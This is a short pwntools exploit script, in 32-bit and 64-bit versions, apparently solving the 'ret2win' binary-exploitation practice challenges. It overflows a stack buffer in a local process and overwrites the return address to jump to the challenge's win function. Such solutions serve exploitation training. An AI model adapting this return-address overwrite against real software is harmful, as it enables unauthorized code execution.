#32 bit
from pwn import*

p=process("./ret2win32")
p.recv()
p.sendline(b'a'*(0x28+4)+p32(0x0804862c))
p.recv()
print(p.recv())

#64 bit
from pwn import*

p=process("./ret2win")
p.recv()
p.sendline(b'a'*(0x20+8)+p64(0x00400756))
p.recv()
print(p.recv())
